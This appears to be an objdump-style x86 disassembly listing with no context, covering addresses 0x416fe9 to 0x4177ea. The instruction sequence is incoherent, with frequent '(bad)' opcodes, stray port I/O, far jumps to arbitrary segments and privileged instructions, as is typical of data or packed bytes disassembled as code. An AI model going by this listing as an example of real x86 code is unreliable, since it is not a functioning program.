  416fe9:	push   ss
  416fea:	dec    edx
  416feb:	into   
  416fec:	arpl   bx,si
  416fee:	outs   dx,DWORD PTR ds:[esi]
  416fef:	loopne 0x41703e
  416ff1:	fild   QWORD PTR [ebx+0x45]
  416ff4:	mov    eax,DWORD PTR [eax]
  416ff6:	add    eax,edx
  416ff8:	mov    edx,0x54baedfb
  416ffd:	call   0xb2fe:0x79cab968
  417004:	nop
  417005:	xchg   BYTE PTR [eax-0x815e182],bh
  41700b:	imul   edi,ebp,0x6d4ea7ed
  417011:	fisub  DWORD PTR [edx+0x57d55d71]
  417017:	rcr    DWORD PTR [eax],1
  417019:	bound  edx,QWORD PTR [ecx+0xf]
  41701c:	pop    ebx
  41701d:	inc    edx
  41701e:	push   ebp
  41701f:	into   
  417020:	enter  0xde61,0x19
  417024:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  417026:	fs inc edx
  417028:	ins    BYTE PTR es:[edi],dx
  417029:	sub    ch,al
  41702b:	push   eax
  41702c:	cmp    edi,DWORD PTR es:[ebp-0x6752a23d]
  417033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417034:	push   ebx
  417035:	loopne 0x417076
  417037:	test   BYTE PTR [eax],ah
  417039:	in     al,dx
  41703a:	ins    DWORD PTR es:[edi],dx
  41703b:	or     eax,0xafae5ae9
  417040:	test   DWORD PTR [ecx+0x549f8a3f],edi
  417046:	add    edx,DWORD PTR [ebx+0x21ac7745]
  41704c:	sub    ch,dl
  41704e:	push   esp
  41704f:	clc    
  417050:	jmp    0x479b5787
  417055:	dec    ebp
  417056:	inc    eax
  417057:	std    
  417058:	mov    al,ds:0xc32a54d
  41705d:	std    
  41705e:	pop    ecx
  41705f:	adc    al,0x9e
  417061:	inc    esp
  417062:	pop    edi
  417063:	pop    ebp
  417064:	add    ax,0xad31
  417068:	mov    ecx,0x24f1f97d
  41706d:	mov    dh,0x28
  41706f:	sub    DWORD PTR [edi+0x37],esp
  417072:	sbb    eax,0xcda10eff
  417077:	jnp    0x41705f
  417079:	inc    ebp
  41707a:	xchg   ebp,eax
  41707b:	shl    edx,cl
  41707d:	mul    BYTE PTR [edi-0x7f]
  417080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417081:	daa    
  417082:	imul   esi,DWORD PTR [edx+0x71054e33],0xffffffe1
  417089:	adc    DWORD PTR [edx+0xc8c9100],0x6cac3ec5
  417093:	out    0xbb,al
  417095:	push   ebp
  417096:	sbb    DWORD PTR [ebx*2-0x235d13b4],esp
  41709d:	add    BYTE PTR [ebp-0x6f5d9eb0],cl
  4170a3:	mov    al,0x53
  4170a5:	pop    edi
  4170a6:	mov    ecx,0xae9d4321
  4170ab:	push   0x46
  4170ad:	pop    edi
  4170ae:	stos   DWORD PTR es:[edi],eax
  4170af:	dec    esi
  4170b0:	and    DWORD PTR gs:[esi+0x2d],eax
  4170b4:	inc    edx
  4170b5:	repz data16 add bh,BYTE PTR [ecx+0x18d05762]
  4170bd:	push   cs
  4170be:	(bad)  
  4170bf:	mov    al,ds:0x520cc13e
  4170c4:	add    bl,al
  4170c6:	lock mov ds:0xf089aefd,eax
  4170cc:	ficomp WORD PTR [eax]
  4170ce:	inc    esp
  4170cf:	jnp    0x417125
  4170d1:	ror    dl,cl
  4170d3:	mov    bl,0x5a
  4170d5:	xor    BYTE PTR [ebx+0x52],0xab
  4170d9:	mov    eax,0xdb2f33bb
  4170de:	stos   DWORD PTR es:[edi],eax
  4170df:	or     bl,bh
  4170e1:	test   BYTE PTR [esp+edx*4],ah
  4170e4:	sbb    bl,bl
  4170e6:	bound  edx,QWORD PTR [ebp-0x115d7b48]
  4170ec:	jbe    0x4170f5
  4170ee:	js     0x417169
  4170f0:	inc    ebp
  4170f1:	jb     0x41708e
  4170f3:	aad    0x6
  4170f5:	pop    esp
  4170f6:	xchg   ebx,eax
  4170f7:	(bad)  
  4170f8:	out    0xe0,eax
  4170fa:	pop    ecx
  4170fb:	mov    ebx,DWORD PTR [edx-0x2dec84b0]
  417101:	ja     0x417162
  417103:	and    al,BYTE PTR [ebx-0x68]
  417106:	mul    WORD PTR [edi-0x467ac789]
  41710d:	mov    eax,ds:0x4d02518b
  417112:	mov    esi,0xfda047ea
  417117:	xor    al,0xfa
  417119:	out    dx,eax
  41711a:	and    al,BYTE PTR [ebx]
  41711c:	or     dh,cl
  41711e:	push   ebx
  41711f:	cmp    dh,BYTE PTR [ebp+0x42]
  417122:	imul   ecx,ecx,0x48ac81aa
  417128:	adc    edi,DWORD PTR [ecx-0x40]
  41712b:	mov    ecx,0xa45bc68b
  417130:	rcl    BYTE PTR [ebp+0x77196d72],0xf9
  417137:	mov    dl,0x54
  417139:	sub    DWORD PTR [esi+0x55],eax
  41713c:	in     al,0x84
  41713e:	jmp    0xc565:0x3efa7f35
  417145:	cs jb  0x417182
  417148:	push   esp
  417149:	pop    ecx
  41714a:	pop    esi
  41714b:	popa   
  41714c:	dec    esi
  41714d:	sub    dh,ch
  41714f:	jle    0x417172
  417151:	addr16 aam 0x5f
  417154:	xchg   ah,cl
  417156:	sbb    BYTE PTR [ebx-0x34],al
  417159:	bound  esp,QWORD PTR [esi]
  41715b:	fld    QWORD PTR [ebx]
  41715d:	push   edx
  41715e:	ja     0x417127
  417160:	ins    DWORD PTR es:[edi],dx
  417161:	out    dx,al
  417162:	cld    
  417163:	fimul  WORD PTR [edi-0x4d]
  417166:	xor    al,0x9b
  417168:	test   al,0x4
  41716a:	xor    al,0x7b
  41716c:	(bad)  
  41716d:	inc    BYTE PTR [ebx]
  41716f:	cmp    DWORD PTR ds:0xbe95947d,ecx
  417175:	push   0xde18f1a4
  41717a:	mov    ecx,0xe00adfaf
  41717f:	in     al,0xf2
  417181:	fs mov edi,0x6b570e2e
  417187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417189:	sub    eax,0x57bd22e3
  41718e:	(bad)  
  41718f:	sbb    DWORD PTR [edx+0x74],eax
  417192:	push   0x3a
  417194:	cmp    DWORD PTR [ecx-0xf],0x6f
  417198:	add    BYTE PTR [eax+0x70],0x81
  41719c:	(bad)  
  41719d:	dec    esi
  41719e:	ins    DWORD PTR es:[edi],dx
  41719f:	std    
  4171a0:	inc    ebp
  4171a1:	xchg   ebp,eax
  4171a2:	(bad)  
  4171a3:	push   cs
  4171a4:	mov    ds:0xfc4243d4,eax
  4171a9:	mov    ecx,DWORD PTR [ebx]
  4171ab:	sbb    ch,BYTE PTR [edi+esi*2]
  4171ae:	push   edi
  4171af:	push   0xece999f
  4171b4:	dec    edi
  4171b5:	mov    al,ds:0x5c6ce351
  4171ba:	int    0x8a
  4171bc:	mov    bl,0xe2
  4171be:	and    esi,ebx
  4171c0:	(bad)  
  4171c1:	pusha  
  4171c2:	add    al,0x62
  4171c4:	enter  0x57f3,0x2a
  4171c8:	cdq    
  4171c9:	lods   eax,DWORD PTR ds:[esi]
  4171ca:	inc    ebp
  4171cb:	xchg   ebx,eax
  4171cc:	jbe    0x41722f
  4171ce:	dec    eax
  4171cf:	in     eax,0x3d
  4171d1:	call   0x6449:0xbebb0f93
  4171d8:	xor    bl,cl
  4171da:	(bad)  
  4171db:	xchg   ebx,eax
  4171dc:	pusha  
  4171dd:	stos   BYTE PTR es:[edi],al
  4171de:	add    dl,BYTE PTR [ecx]
  4171e0:	sbb    al,0xc
  4171e2:	fcomp  st(0)
  4171e4:	mov    cl,0xea
  4171e6:	imul   ecx,DWORD PTR [eax-0x5c5148b0],0xfca103dc
  4171f0:	retf   
  4171f1:	xchg   edi,eax
  4171f2:	xchg   BYTE PTR [edx+0x1497b656],cl
  4171f8:	dec    edi
  4171f9:	dec    edi
  4171fa:	jb     0x4171c1
  4171fc:	imul   esi,DWORD PTR [ebx-0x15],0xffffffdd
  417200:	in     eax,0xc0
  417202:	in     eax,dx
  417203:	jmp    0x41727b
  417205:	pop    ds
  417206:	call   0xa6df0925
  41720b:	jmp    0x417231
  41720d:	pextrw ecx,(bad),0xc5
  41720f:	or     DWORD PTR [ebp+0x1d6c834d],edx
  417215:	pop    ecx
  417216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417217:	add    ebp,edi
  417219:	push   eax
  41721a:	sbb    ecx,eax
  41721c:	jne    0x41722d
  41721e:	(bad)  
  41721f:	pop    ds
  417220:	daa    
  417221:	fsubr  DWORD PTR [eax]
  417223:	(bad)  
  417224:	xchg   edx,eax
  417225:	rcl    BYTE PTR [esi+edi*1+0x71],0x5d
  41722a:	mov    bh,bh
  41722c:	fwait
  41722d:	aam    0xa9
  41722f:	push   ebp
  417230:	and    edi,eax
  417232:	pop    esi
  417233:	push   0x14
  417235:	sti    
  417236:	leave  
  417237:	fstp   st(4)
  417239:	nop
  41723a:	jbe    0x417212
  41723c:	mov    ebx,0x19c7c0b2
  417241:	jns    0x4171d5
  417243:	or     eax,0xf6a15a13
  417248:	mov    ch,0xc6
  41724a:	iret   
  41724b:	mov    ebp,0x2e3bd077
  417250:	and    DWORD PTR [ebx+eiz*4],eax
  417253:	aaa    
  417254:	mov    esi,esi
  417256:	or     ebp,DWORD PTR [esi+0x1eeffa83]
  41725c:	mov    dl,0x62
  41725e:	gs sub al,0x8e
  417261:	inc    eax
  417262:	and    esp,DWORD PTR [eax+0xf19b875]
  417268:	fdivr  st,st(1)
  41726a:	or     DWORD PTR [eax],0xb3637728
  417270:	fld    QWORD PTR [edx]
  417272:	in     al,0x11
  417274:	adc    BYTE PTR [ebp+0x1c9738a2],0x92
  41727b:	or     al,0xa4
  41727d:	or     DWORD PTR [ebx-0x156aebf6],eax
  417283:	inc    ebx
  417284:	sbb    eax,0x4dfab957
  417289:	dec    eax
  41728a:	dec    edi
  41728b:	in     al,dx
  41728c:	mov    dl,0xd7
  41728e:	loop   0x41726f
  417290:	and    eax,0xda46d710
  417295:	aam    0x32
  417297:	mov    ds:0x335202f6,eax
  41729c:	jg     0x4172c8
  41729e:	adc    dh,BYTE PTR [esi-0x7]
  4172a1:	movups xmm6,xmm7
  4172a4:	sbb    bl,BYTE PTR [edx+0x22e372e0]
  4172aa:	ds sti 
  4172ac:	dec    ecx
  4172ad:	data16 (bad) 
  4172af:	jmp    0xef9b:0x20345908
  4172b6:	and    BYTE PTR [ecx-0x1734c9be],bl
  4172bc:	jp     0x417283
  4172be:	test   al,0xe0
  4172c0:	ret    
  4172c1:	sub    ebx,DWORD PTR [eax+eax*4-0x47f319c0]
  4172c8:	inc    ebx
  4172c9:	xchg   DWORD PTR ss:[edi-0x51030254],ebx
  4172d0:	fmul   st,st(1)
  4172d2:	or     eax,0x57fb8078
  4172d7:	repnz pop ss
  4172d9:	or     eax,0xe7ac1b88
  4172de:	xor    eax,0x85751ddf
  4172e4:	icebp  
  4172e5:	or     dh,BYTE PTR [ecx-0xeb9020b]
  4172eb:	int3   
  4172ec:	in     al,0xee
  4172ee:	sbb    DWORD PTR [eax],esi
  4172f0:	shl    BYTE PTR [ebx-0x6a],1
  4172f3:	dec    esi
  4172f4:	cmp    esi,0xffffffad
  4172f7:	hlt    
  4172f8:	sti    
  4172f9:	pusha  
  4172fa:	add    eax,DWORD PTR [ebp-0x60]
  4172fd:	inc    edi
  4172fe:	icebp  
  4172ff:	out    0xeb,eax
  417301:	push   0xccd17f67
  417306:	jmp    edx
  417308:	je     0x41732a
  41730a:	mov    ?,eax
  41730c:	test   DWORD PTR [edi+0x2d15cea5],ebx
  417312:	xchg   ebx,eax
  417313:	add    eax,esp
  417315:	mov    ds:0x26be18f6,eax
  41731a:	xchg   ecx,eax
  41731b:	(bad)  
  41731c:	enter  0x19fb,0xcc
  417320:	cmp    BYTE PTR ds:0xc79e15f1,ah
  417326:	sub    ecx,DWORD PTR [ebp+0x70acf88a]
  41732c:	and    BYTE PTR [edi+0x5a],al
  41732f:	and    BYTE PTR [edi],0xfc
  417332:	mov    ds:0xa2a010ef,eax
  417337:	(bad)  
  417338:	dec    esp
  417339:	mov    dh,0x7b
  41733b:	push   cs
  41733c:	inc    esi
  41733d:	in     eax,0x9b
  41733f:	xchg   edx,eax
  417340:	pop    ebx
  417341:	pop    eax
  417342:	xchg   edi,eax
  417343:	(bad)  
  417344:	and    eax,0xfdff4d30
  417349:	and    ch,BYTE PTR [ebx+0x3cea4ba6]
  41734f:	mov    ebp,0x832806e3
  417354:	sub    ch,BYTE PTR [ecx+0x51db552e]
  41735a:	ret    
  41735b:	mov    ecx,0xa90123f4
  417360:	push   cs
  417361:	and    al,BYTE PTR [esi]
  417363:	je     0x41737e
  417365:	(bad)  
  417366:	mov    ebx,0x326c463
  41736b:	push   cs
  41736c:	jmp    0x41738d
  41736e:	retf   
  41736f:	xchg   ebp,eax
  417370:	aad    0xa1
  417372:	add    esp,0x4bfa51c
  417378:	jle    0x417323
  41737a:	adc    eax,0xebd48cfa
  41737f:	ins    DWORD PTR es:[edi],dx
  417380:	jl     0x4173f7
  417382:	mov    dh,0xaa
  417384:	outs   dx,BYTE PTR ds:[esi]
  417385:	jns    0x4173c3
  417387:	mov    ah,0xe2
  417389:	push   eax
  41738a:	enter  0x9010,0xe9
  41738e:	repz imul eax,DWORD PTR [esp+eiz*4],0xffffffa2
  417393:	pop    esp
  417394:	sbb    al,BYTE PTR [edx-0x3b]
  417397:	xchg   edx,eax
  417398:	jmp    0xfb6:0x384c19a3
  41739f:	push   edi
  4173a0:	lods   eax,DWORD PTR ds:[esi]
  4173a1:	dec    ecx
  4173a2:	pop    esp
  4173a3:	sbb    ecx,DWORD PTR [esi-0x3a]
  4173a6:	or     eax,0x8be7a898
  4173ab:	(bad)  
  4173ac:	addr16 dec esp
  4173ae:	test   eax,0x88d96c66
  4173b3:	jp     0x41739d
  4173b5:	sbb    eax,edi
  4173b7:	leave  
  4173b8:	or     ah,dh
  4173ba:	cld    
  4173bb:	pop    esi
  4173bc:	lea    esp,[edi]
  4173be:	sub    al,BYTE PTR [ebp+0x1]
  4173c1:	ret    
  4173c2:	repz cmp BYTE PTR [ebx+0x640fc148],ah
  4173c9:	test   al,0x4f
  4173cb:	cs pushf 
  4173cd:	fisttp DWORD PTR [eax-0x42]
  4173d0:	sub    eax,DWORD PTR es:[esi-0x5532d20b]
  4173d7:	or     al,0x22
  4173d9:	jmp    0x72c7:0xc06933c6
  4173e0:	nop
  4173e1:	inc    esi
  4173e2:	sub    cl,BYTE PTR [ebx-0xdeff1cc]
  4173e8:	add    edi,edx
  4173ea:	ins    BYTE PTR es:[edi],dx
  4173eb:	bound  edi,QWORD PTR [edx-0x2b6492d5]
  4173f1:	stos   DWORD PTR es:[edi],eax
  4173f2:	test   eax,0x5ea8c028
  4173f7:	mov    al,0xa5
  4173f9:	ror    cl,cl
  4173fb:	push   edx
  4173fc:	mov    BYTE PTR [ebx],bh
  4173fe:	lods   al,BYTE PTR ds:[esi]
  4173ff:	mov    DWORD PTR [edx],esi
  417401:	lea    ecx,[edx]
  417403:	(bad)  
  417404:	lea    eax,[edi-0x1d55c84b]
  41740a:	arpl   WORD PTR [ecx+0x4c],cx
  41740d:	xlat   BYTE PTR ds:[ebx]
  41740e:	and    DWORD PTR [edx+0x3710f1e6],0xffffff84
  417415:	dec    ebp
  417416:	or     al,0x27
  417418:	out    dx,eax
  417419:	or     al,BYTE PTR [esi-0x71]
  41741c:	rcl    DWORD PTR ds:[esi+0x4f],0xd1
  417421:	aam    0x48
  417423:	xchg   DWORD PTR [edi-0x20],ecx
  417426:	or     bl,BYTE PTR [esi]
  417428:	imul   edx,DWORD PTR [ecx+edi*8+0x4fab5266],0xffffff9e
  417430:	pop    edx
  417431:	mov    BYTE PTR [edx+0x73],dh
  417434:	in     eax,dx
  417435:	and    eax,DWORD PTR [edx-0x3470102]
  41743b:	cmp    dh,al
  41743d:	adc    DWORD PTR [esi+0x209e3956],0xc2d34e69
  417447:	imul   eax,DWORD PTR [esi+0x23],0x911640f9
  41744e:	fldz   
  417450:	test   eax,0x1f0b2716
  417455:	jo     0x417445
  417457:	icebp  
  417458:	push   ebp
  417459:	pop    eax
  41745a:	cmp    al,bl
  41745c:	in     eax,dx
  41745d:	cmc    
  41745e:	addr16 or al,0xba
  417461:	(bad)  
  417462:	cwd    
  417464:	pop    ds
  417465:	mov    esp,DWORD PTR [edx]
  417467:	(bad)  
  417468:	pop    eax
  417469:	xlat   BYTE PTR ds:[ebx]
  41746a:	fcmovnb st,st(3)
  41746c:	stc    
  41746d:	push   esp
  41746e:	ret    
  41746f:	imul   edi,DWORD PTR [ebx-0x487ab8c8],0xa78af690
  417479:	mov    al,0x2f
  41747b:	sbb    eax,0x14c18bfc
  417480:	out    dx,al
  417481:	out    0xf7,eax
  417483:	cmp    esp,DWORD PTR [ebx+0x49385a63]
  417489:	push   ds
  41748a:	jne    0x41742a
  41748c:	mov    bh,0xc7
  41748e:	sub    edx,DWORD PTR [edx+0x341eef88]
  417494:	into   
  417495:	mov    edx,0x96d5a1f2
  41749a:	loopne 0x4174c4
  41749c:	call   0x58b0:0x4689e8ab
  4174a3:	inc    ecx
  4174a4:	imul   edi,DWORD PTR [edi+eiz*2-0x76],0x39
  4174a9:	mov    ebp,0x90ee7fd
  4174ae:	inc    ebx
  4174af:	dec    esp
  4174b0:	mov    ds:0x5124a48f,eax
  4174b5:	add    ebp,esp
  4174b7:	pop    ds
  4174b8:	lods   eax,DWORD PTR ds:[esi]
  4174b9:	inc    ecx
  4174ba:	dec    eax
  4174bb:	pusha  
  4174bc:	mov    eax,cs
  4174be:	dec    ebp
  4174bf:	mov    dl,BYTE PTR [edi]
  4174c1:	jp     0x4174e9
  4174c3:	mov    ?,WORD PTR [edi]
  4174c5:	popa   
  4174c6:	ins    BYTE PTR es:[edi],dx
  4174c7:	into   
  4174c8:	scas   eax,DWORD PTR es:[edi]
  4174c9:	into   
  4174ca:	cdq    
  4174cb:	and    ch,BYTE PTR [ebx]
  4174cd:	xchg   edi,eax
  4174ce:	psllq  mm6,QWORD PTR [esi-0x1d]
  4174d2:	xchg   esp,eax
  4174d3:	bnd jp 0x4174e2
  4174d6:	(bad)  
  4174d8:	pop    esp
  4174d9:	in     eax,0x3c
  4174db:	mov    bl,0x84
  4174dd:	jmp    0x9b5e:0x9ce31fe8
  4174e4:	push   edx
  4174e5:	arpl   bp,sp
  4174e7:	inc    ecx
  4174e8:	rcl    ebx,0xb3
  4174eb:	cmc    
  4174ec:	icebp  
  4174ed:	mov    ebp,0x377cf4d6
  4174f2:	nop
  4174f3:	loopne 0x4174a5
  4174f5:	out    0x2f,eax
  4174f7:	int    0xb0
  4174f9:	out    dx,eax
  4174fa:	cli    
  4174fb:	and    eax,0x1b38feaa
  417500:	jno    0x4174bb
  417502:	add    ecx,DWORD PTR [eax-0x55]
  417505:	xchg   ebx,eax
  417507:	and    edx,ebx
  417509:	addr16 adc eax,0xcd5a144f
  41750f:	or     ch,al
  417511:	in     al,dx
  417512:	lea    edi,[eax-0x2d]
  417515:	fidivr WORD PTR [esi+esi*4-0x79e70caa]
  41751c:	and    BYTE PTR [ecx-0x7d0a20a4],dh
  417522:	xchg   ebx,eax
  417523:	add    esp,DWORD PTR [edx+eiz*1]
  417526:	ja     0x417577
  417528:	cmp    eax,0x4aeccc04
  41752d:	add    al,0xcf
  41752f:	jnp    0x41759e
  417531:	jmp    0xbbef:0xf42f26ee
  417538:	sbb    ch,cl
  41753a:	jmp    0x58ad:0xdcbe31ff
  417541:	sub    ah,BYTE PTR [edx-0x42]
  417544:	and    bh,0xb8
  417547:	shr    BYTE PTR [ebx],cl
  417549:	in     eax,0x87
  41754b:	add    BYTE PTR [ebx],dl
  41754d:	push   esi
  41754e:	push   ss
  41754f:	outs   dx,DWORD PTR ds:[esi]
  417550:	push   es
  417551:	mov    edx,0xc867799c
  417556:	(bad)  
  417557:	js     0x4175c2
  417559:	sub    eax,0xeba4e5a2
  41755e:	sbb    al,0x55
  417560:	adc    eax,0xf238f6bb
  417565:	scas   eax,DWORD PTR es:[edi]
  417566:	push   esi
  417567:	inc    edi
  417568:	stc    
  417569:	jecxz  0x4175a7
  41756b:	cmp    DWORD PTR [ebp+eax*8+0x23],0xffffffdd
  417570:	sbb    eax,0xc536c7a8
  417575:	enter  0x6111,0xa8
  417579:	adc    ebx,DWORD PTR ds:0x95d45cd
  41757f:	mov    ch,0xc3
  417581:	jnp    0x417570
  417583:	out    0x74,eax
  417585:	add    ch,dh
  417587:	mov    cl,0xd9
  417589:	test   dh,ah
  41758b:	lea    ebx,[eax+0x24]
  41758e:	lahf   
  41758f:	lea    esi,[ecx+edi*1+0x6f]
  417593:	pop    es
  417594:	xchg   ebp,eax
  417595:	dec    ecx
  417596:	clc    
  417597:	rcl    DWORD PTR ss:[edx+0x5c],1
  41759b:	je     0x4175c7
  41759d:	jg     0x417523
  41759f:	scas   eax,DWORD PTR es:[edi]
  4175a0:	mov    ecx,0xade9db99
  4175a5:	in     eax,dx
  4175a6:	sti    
  4175a7:	std    
  4175a8:	es push 0xb66d1ce9
  4175ae:	push   ebx
  4175af:	sar    BYTE PTR [ebp+0x4f],cl
  4175b2:	xchg   ebp,eax
  4175b3:	cld    
  4175b4:	sbb    BYTE PTR [ebx-0x62f9f0e0],al
  4175ba:	test   al,0xce
  4175bc:	mov    al,ds:0xfed739b8
  4175c1:	cwde   
  4175c2:	add    ax,0x7926
  4175c6:	hlt    
  4175c7:	lea    esi,[ecx]
  4175c9:	ins    BYTE PTR es:[edi],dx
  4175ca:	(bad)  [ecx+0x588bc97b]
  4175d0:	inc    ebp
  4175d1:	push   ecx
  4175d2:	cmc    
  4175d3:	mov    bh,0xe5
  4175d5:	inc    edi
  4175d6:	add    BYTE PTR [esi+0x42],dh
  4175d9:	arpl   WORD PTR [edx+0x158aa36],dx
  4175df:	push   ecx
  4175e0:	pop    ebp
  4175e1:	nop
  4175e2:	adc    ch,BYTE PTR [edi]
  4175e4:	jmp    0xd3b3a19a
  4175e9:	(bad)  
  4175eb:	sbb    dh,cl
  4175ed:	fldenv [eax-0x3a]
  4175f0:	sub    al,0x20
  4175f2:	scas   al,BYTE PTR es:[edi]
  4175f3:	dec    ecx
  4175f4:	pop    es
  4175f5:	dec    eax
  4175f6:	jg     0x417608
  4175f8:	adc    ch,bl
  4175fa:	inc    edx
  4175fb:	mov    cl,0x93
  4175fd:	jo     0x417676
  4175ff:	mov    ds:0x96262e79,eax
  417604:	mov    ds:0xf120fabd,eax
  417609:	icebp  
  41760a:	cmc    
  41760b:	call   FWORD PTR [edx]
  41760d:	cmp    DWORD PTR [edi-0x68],ecx
  417610:	or     BYTE PTR [edx],bl
  417612:	rol    BYTE PTR [eax+0x4],1
  417615:	jo     0x41762f
  417617:	stc    
  417618:	cld    
  417619:	jl     0x417695
  41761b:	stc    
  41761c:	ins    BYTE PTR es:[edi],dx
  41761d:	jge    0x417635
  41761f:	jns    0x417675
  417621:	push   0x4c
  417623:	ret    
  417624:	jp     0x41760e
  417626:	neg    al
  417628:	add    dh,bl
  41762a:	push   0xe80e021d
  41762f:	test   al,0x1c
  417631:	out    0xec,al
  417633:	nop
  417634:	addr16 test eax,0x823b8de0
  41763a:	mov    ds:0xd00dce6d,al
  41763f:	bound  edi,QWORD PTR [ebx]
  417641:	pop    eax
  417642:	loop   0x41761c
  417644:	adc    al,0x3d
  417646:	xchg   esp,eax
  417647:	mov    al,cl
  417649:	in     eax,0x10
  41764b:	pop    ds
  41764c:	mov    esi,0x38428d8f
  417651:	xchg   ebx,eax
  417652:	(bad)  
  417653:	std    
  417654:	sbb    al,0xd8
  417656:	adc    al,0xea
  417658:	and    al,BYTE PTR [eax+0x32d4a3c6]
  41765e:	neg    DWORD PTR [ecx+0x75]
  417661:	pop    ss
  417662:	out    0xfd,al
  417664:	jecxz  0x417608
  417666:	rcl    BYTE PTR [edx],1
  417668:	icebp  
  417669:	mov    fs,WORD PTR [edx+ecx*8]
  41766c:	int    0x81
  41766e:	rcl    ah,0x5c
  417671:	inc    ebx
  417672:	lods   al,BYTE PTR ds:[esi]
  417673:	add    dl,BYTE PTR [ebx+edi*2]
  417676:	add    BYTE PTR [ecx+ebx*4+0x44],dh
  41767a:	cmc    
  41767b:	arpl   di,di
  41767d:	sub    dl,al
  41767f:	add    eax,0x1349ef61
  417684:	jmp    0xd67c:0x5b00bc23
  41768b:	jle    0x417653
  41768d:	jo     0x417630
  41768f:	mov    ebp,0x94139b73
  417694:	sbb    al,0x78
  417696:	inc    ebx
  417697:	int    0x18
  417699:	cli    
  41769a:	push   0x6
  41769c:	mov    ebx,0xfd50b9a9
  4176a1:	pop    DWORD PTR [ebx]
  4176a3:	ret    
  4176a4:	scas   al,BYTE PTR es:[edi]
  4176a5:	jl     0x417700
  4176a7:	mov    ebp,0xa568dc43
  4176ac:	ss iret 
  4176ae:	push   ss
  4176af:	xor    eax,0x96d0d347
  4176b4:	pop    esi
  4176b5:	push   ss
  4176b6:	int3   
  4176b7:	ret    0x9848
  4176ba:	inc    ecx
  4176bb:	data16 out dx,al
  4176bd:	lods   eax,DWORD PTR ds:[esi]
  4176be:	pop    es
  4176bf:	shr    DWORD PTR [edx-0x53],1
  4176c2:	adc    al,0xc0
  4176c4:	in     eax,0xd3
  4176c6:	sub    eax,0x118dc8fa
  4176cb:	test   DWORD PTR [edx],esp
  4176cd:	ret    0x3e96
  4176d0:	cmc    
  4176d1:	or     BYTE PTR [edx-0x30636989],0x8e
  4176d8:	outs   dx,DWORD PTR ds:[esi]
  4176d9:	pop    eax
  4176db:	pop    ecx
  4176dc:	sub    DWORD PTR [ebx-0x2c],esp
  4176df:	adc    ebx,DWORD PTR [ecx]
  4176e1:	mov    eax,ds:0x9ba4e8dd
  4176e6:	add    edx,esp
  4176e8:	add    DWORD PTR [edi-0x23],eax
  4176eb:	rcr    DWORD PTR [eax-0x56157098],0xbe
  4176f2:	mov    ebp,0xf7dd375b
  4176f7:	mov    esp,0x3db4dda9
  4176fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176fd:	popa   
  4176fe:	sbb    BYTE PTR [edi-0x4a],cl
  417701:	cli    
  417702:	in     eax,0x74
  417704:	in     al,0x90
  417706:	std    
  417707:	into   
  417708:	inc    ebp
  417709:	sbb    BYTE PTR [ebx],ch
  41770b:	xchg   edx,eax
  41770c:	cmp    al,0x1b
  41770e:	mov    eax,0xda813bd3
  417713:	ret    0x64bd
  417716:	sti    
  417717:	inc    edi
  417718:	outs   dx,DWORD PTR ds:[esi]
  417719:	(bad)  
  41771a:	xchg   edx,eax
  41771b:	(bad)  
  41771c:	push   eax
  41771d:	cmp    al,BYTE PTR [ebp-0x2d8e01d9]
  417723:	dec    esp
  417724:	and    esp,DWORD PTR [ebx+ebx*8+0x57a7265a]
  41772b:	inc    edx
  41772c:	test   DWORD PTR [ebx+ecx*4+0x33],ebp
  417730:	pop    esi
  417731:	mov    ?,WORD PTR [esi]
  417733:	xor    DWORD PTR [ebx+ebx*2-0x13],ecx
  417737:	and    DWORD PTR [edi-0xe],0x56d015ba
  41773e:	dec    esp
  41773f:	push   eax
  417740:	inc    ebp
  417741:	daa    
  417742:	out    0x42,eax
  417744:	cmp    esp,ebp
  417746:	add    DWORD PTR [eax+0x29],ebp
  417749:	cmp    esi,DWORD PTR [edi]
  41774b:	or     cl,bl
  41774d:	push   ds
  41774e:	sub    eax,0x6ecfcf89
  417753:	mov    ebx,DWORD PTR [ebx+0x660bbbe8]
  417759:	mov    al,0xc8
  41775b:	stos   BYTE PTR es:[edi],al
  41775c:	and    eax,0xfe79edfe
  417761:	sar    BYTE PTR [ebx-0x81dba65],cl
  417767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417768:	mov    ds:0x10a9bd1f,al
  41776d:	mov    DWORD PTR [ecx-0x6a],ebp
  417770:	xchg   esp,eax
  417771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417772:	ja     0x4177ef
  417774:	sbb    eax,0xf47a1695
  417779:	xchg   DWORD PTR [eax-0x53],edi
  41777c:	div    BYTE PTR [ebx-0x3b]
  41777f:	cli    
  417780:	inc    eax
  417781:	fidivr DWORD PTR [ecx+0x3b]
  417784:	test   al,0xdf
  417786:	test   eax,0xa3488a19
  41778b:	pop    ebx
  41778c:	ins    BYTE PTR es:[edi],dx
  41778d:	adc    BYTE PTR [edx-0x38],dl
  417790:	pusha  
  417791:	vmread DWORD PTR [esi-0x11],edx
  417795:	int    0xdb
  417797:	retf   0xc9ec
  41779a:	int3   
  41779b:	hlt    
  41779c:	lahf   
  41779d:	leave  
  41779e:	scas   al,BYTE PTR es:[edi]
  41779f:	mov    esi,0xd16a6049
  4177a4:	in     eax,0x4a
  4177a6:	ins    BYTE PTR es:[edi],dx
  4177a7:	test   DWORD PTR [esp+ecx*4+0x2e45d0d],esi
  4177ae:	push   eax
  4177af:	ret    
  4177b0:	add    DWORD PTR [ebx],0x11c44fb5
  4177b6:	pusha  
  4177b7:	pop    esp
  4177b8:	mov    edx,0x39b20685
  4177bd:	aam    0x16
  4177bf:	and    BYTE PTR [ebp+0x7f],bh
  4177c2:	shl    BYTE PTR [esi],cl
  4177c4:	jle    0x4177bb
  4177c6:	imul   ebp,DWORD PTR [ecx+ecx*1+0x568e574],0x48
  4177ce:	leave  
  4177cf:	out    0x84,eax
  4177d1:	mov    al,ds:0x41ab48b3
  4177d6:	cli    
  4177d7:	sahf   
  4177d8:	or     eax,0xecef494d
  4177dd:	(bad)  
  4177de:	int3   
  4177df:	(bad)  
  4177e1:	(bad)  
  4177e3:	xlat   BYTE PTR ds:[ebx]
  4177e4:	imul   edi,edi,0x83b3ba79
  4177ea:	adc    bh,BYTE PTR [eax]
